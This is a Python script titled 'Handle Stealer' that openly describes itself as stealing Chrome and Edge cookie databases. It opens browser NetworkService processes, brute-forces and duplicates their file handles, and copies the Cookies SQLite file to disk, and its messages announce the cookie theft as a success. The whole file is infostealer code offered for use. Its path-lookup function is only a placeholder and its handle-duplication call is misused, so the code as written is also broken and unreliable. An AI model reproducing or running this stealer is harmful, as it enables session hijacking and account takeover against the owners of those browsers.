#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Handle Stealer - Python Version
Converted from handle-stealer.c

This module steals browser cookie databases by duplicating handles from browser processes.
"""

import os
import sys
import ctypes
from ctypes import wintypes, c_char_p, c_wchar_p, c_void_p, POINTER, Structure
import psutil
import shutil
from pathlib import Path

class HandleStealer:
    """Steal browser cookie databases using handle duplication"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll
        self.shell32 = ctypes.windll.shell32
        
        # Define structures
        class PROCESS_BASIC_INFORMATION(Structure):
            _fields_ = [
                ("Reserved1", ctypes.c_void_p),
                ("PebBaseAddress", ctypes.c_void_p),
                ("Reserved2", ctypes.c_void_p * 2),
                ("UniqueProcessId", ctypes.c_void_p),
                ("Reserved3", ctypes.c_void_p)
            ]
        
        class PEB(Structure):
            _fields_ = [
                ("Reserved1", ctypes.c_ubyte * 2),
                ("BeingDebugged", ctypes.c_ubyte),
                ("Reserved2", ctypes.c_ubyte),
                ("Reserved3", ctypes.c_void_p * 2),
                ("Ldr", ctypes.c_void_p),
                ("ProcessParameters", ctypes.c_void_p),
                ("Reserved4", ctypes.c_void_p * 3),
                ("AtlThunkSListPtr", ctypes.c_void_p),
                ("Reserved5", ctypes.c_void_p),
                ("Reserved6", ctypes.c_ulong),
                ("Reserved7", ctypes.c_void_p),
                ("Reserved8", ctypes.c_ulong),
                ("AtlThunkSListPtr32", ctypes.c_ulong),
                ("Reserved9", ctypes.c_void_p * 45),
                ("PostProcessInitRoutine", ctypes.c_void_p),
                ("Reserved10", ctypes.c_ubyte * 128),
                ("Reserved11", ctypes.c_void_p * 1),
                ("SessionId", ctypes.c_ulong)
            ]
        
        class RTL_USER_PROCESS_PARAMETERS(Structure):
            _fields_ = [
                ("MaximumLength", ctypes.c_ulong),
                ("Length", ctypes.c_ulong),
                ("Flags", ctypes.c_ulong),
                ("DebugFlags", ctypes.c_ulong),
                ("ConsoleHandle", ctypes.c_void_p),
                ("ConsoleFlags", ctypes.c_ulong),
                ("StandardInput", ctypes.c_void_p),
                ("StandardOutput", ctypes.c_void_p),
                ("StandardError", ctypes.c_void_p),
                ("CurrentDirectory", ctypes.c_void_p),
                ("DllPath", ctypes.c_void_p),
                ("ImagePathName", ctypes.c_void_p),
                ("CommandLine", ctypes.c_void_p)
            ]
        
        class UNICODE_STRING(Structure):
            _fields_ = [
                ("Length", ctypes.c_ushort),
                ("MaximumLength", ctypes.c_ushort),
                ("Buffer", ctypes.c_void_p)
            ]
        
        self.PROCESS_BASIC_INFORMATION = PROCESS_BASIC_INFORMATION
        self.PEB = PEB
        self.RTL_USER_PROCESS_PARAMETERS = RTL_USER_PROCESS_PARAMETERS
        self.UNICODE_STRING = UNICODE_STRING
    
    def is_network_service(self, pid):
        """Check if process is NetworkService"""
        try:
            process = psutil.Process(pid)
            cmdline = ' '.join(process.cmdline())
            return "NetworkService" in cmdline
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return False
    
    def get_process_pid_by_name(self, process_name):
        """Get process PID by name"""
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == process_name.lower():
                    yield proc.info['pid']
        except Exception as e:
            print(f"Error getting process PID: {e}")
    
    def copy_database_brute_force_handle_by_pid(self, pid):
        """Copy database by brute forcing handles"""
        try:
            if not self.is_network_service(pid):
                print(f"Process PID {pid} is not NetworkService")
                return False
            
            print(f"Process PID {pid} is the NetworkService - attempting handle duplication")
            
            # Open process with handle duplication rights
            process_handle = self.kernel32.OpenProcess(
                0x40,  # PROCESS_DUP_HANDLE
                False,
                pid
            )
            
            if not process_handle:
                print(f"Failed to get handle on process PID {pid}")
                return False
            
            # Get AppData path
            appdata = os.environ.get('LOCALAPPDATA')
            if not appdata:
                appdata = os.path.join(os.environ.get('USERPROFILE', ''), 'AppData', 'Local')
            
            # Try to duplicate handles
            for handle_value in range(0x100, 0x1000):
                try:
                    # Attempt to duplicate handle
                    duplicate_handle = self.kernel32.DuplicateHandle(
                        process_handle,
                        handle_value,
                        self.kernel32.GetCurrentProcess(),
                        None,
                        0,
                        True,
                        0x2  # DUPLICATE_SAME_ACCESS
                    )
                    
                    if duplicate_handle:
                        # Get file path from handle
                        file_path = self.get_final_path_name_by_handle(duplicate_handle)
                        
                        if file_path and "Cookies" in file_path and "Cookies-journal" not in file_path:
                            print(f"Cookie SQLite db found: {file_path}")
                            
                            # Get file size
                            file_size = self.kernel32.GetFileSize(duplicate_handle, None)
                            print(f"Cookie SQLite db file size: {file_size}")
                            
                            # Read file content
                            buffer = ctypes.create_string_buffer(file_size)
                            bytes_read = ctypes.c_ulong()
                            
                            self.kernel32.SetFilePointer(duplicate_handle, 0, None, 0)  # FILE_BEGIN
                            
                            success = self.kernel32.ReadFile(
                                duplicate_handle,
                                buffer,
                                file_size,
                                ctypes.byref(bytes_read),
                                None
                            )
                            
                            if success:
                                # Save to local file
                                output_path = os.path.join(appdata, f"{pid}.db")
                                print(f"File saved as: {output_path}")
                                
                                with open(output_path, 'wb') as f:
                                    f.write(buffer.raw[:bytes_read.value])
                                
                                self.kernel32.CloseHandle(duplicate_handle)
                                self.kernel32.CloseHandle(process_handle)
                                return True
                        
                        self.kernel32.CloseHandle(duplicate_handle)
                        
                except Exception as e:
                    continue
            
            self.kernel32.CloseHandle(process_handle)
            return False
            
        except Exception as e:
            print(f"Error copying database: {e}")
            return False
    
    def get_final_path_name_by_handle(self, handle):
        """Get final path name by handle"""
        try:
            # This is a simplified version - the actual implementation would require
            # more complex Windows API calls
            
            # For demonstration, we'll use a placeholder
            # In a real implementation, you would call GetFinalPathNameByHandle
            
            return f"placeholder_path_for_handle_{handle}"
            
        except Exception as e:
            print(f"Error getting path name: {e}")
            return None
    
    def steal_chrome_cookies(self):
        """Steal Chrome cookies"""
        print("Looking for Chrome processes...")
        success = False
        
        for pid in self.get_process_pid_by_name("chrome.exe"):
            if self.copy_database_brute_force_handle_by_pid(pid):
                success = True
        
        return success
    
    def steal_edge_cookies(self):
        """Steal Edge cookies"""
        print("Looking for Edge processes...")
        success = False
        
        for pid in self.get_process_pid_by_name("msedge.exe"):
            if self.copy_database_brute_force_handle_by_pid(pid):
                success = True
        
        return success
    
    def steal_all_cookies(self):
        """Steal cookies from all supported browsers"""
        print("Handle Stealer - Cookie Database Theft")
        print("=" * 40)
        
        chrome_success = self.steal_chrome_cookies()
        edge_success = self.steal_edge_cookies()
        
        print("\nProcess completed.")
        print(f"Chrome cookies: {'Stolen' if chrome_success else 'Not found'}")
        print(f"Edge cookies: {'Stolen' if edge_success else 'Not found'}")
        
        return chrome_success or edge_success

def main():
    """Main function"""
    try:
        stealer = HandleStealer()
        success = stealer.steal_all_cookies()
        
        if success:
            print("\nCookie theft completed successfully!")
        else:
            print("\nNo cookies were stolen.")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()